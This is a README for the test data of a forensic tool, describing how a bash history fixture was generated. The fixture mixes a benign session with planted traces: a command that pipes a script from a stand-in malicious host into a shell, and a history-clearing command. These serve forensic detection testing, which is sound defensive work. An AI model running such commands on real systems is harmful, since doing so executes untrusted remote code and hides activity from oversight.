# `useract-forensic` test data

`tests/data/` is gitignored fleet-wide; this README is the committed, reproducible
record of the corpus. The single fleet-wide machine index is
[`issen/docs/corpus-catalog.md`](https://github.com/SecurityRonin/issen/blob/main/docs/corpus-catalog.md) —
cross-reference, never duplicate.

#### real_bash_history

- **Classification**: `REAL-self` (generated on the host by a genuine `bash`).
- **Source / Identity**: a real `.bash_history` file authored by the `bash` shell's
  own history writer (`history -s` + `history -w`), with `HISTTIMEFORMAT` set so bash
  emits its `#<epoch>` timestamp lines. Not a synthetic string — the bytes are bash's
  real on-disk history format.
- **Notable contents**: a benign session (`cd`, `ls -la /tmp`, a `cp … /media/usb0/…`
  copy to removable media) plus two planted anti-forensic / threat traces — a
  download-pipe-to-shell (`curl http://malicious.example/payload.sh | sh`) and a
  history-clearing command (`unset HISTFILE`). Each entry carries a distinct epoch
  (1 s apart). A trailing `history -w …` entry is genuine bash self-recording noise.
- **Verbatim generator command**:

  ```bash
  bash --norc -c '
  export HISTTIMEFORMAT="%F %T "
  set -o history
  history -c
  history -s "cd /home/analyst/work";                                   sleep 1
  history -s "ls -la /tmp";                                              sleep 1
  history -s "curl http://malicious.example/payload.sh | sh";           sleep 1
  history -s "cp /home/analyst/work/report.docx /media/usb0/report.docx"; sleep 1
  history -s "unset HISTFILE"
  history -w tests/data/real_bash_history
  '
  ```

  (The exact `#<epoch>` values differ per run; the structure and command set are
  fixed. The committed fixture used in CI was generated once and its hash recorded
  below.)
- **MD5**: `2a4ead0e64d175c7414bb37f23dbed73`

The device side of the real-data test is a genuine `peripheral_core::DeviceConnection`
constructed in-code (a USB mass-storage stick, `USBSTOR\…` instance id) in
`tests/real_data.rs::usb_stick` — no on-disk fixture, so there is nothing to hash.
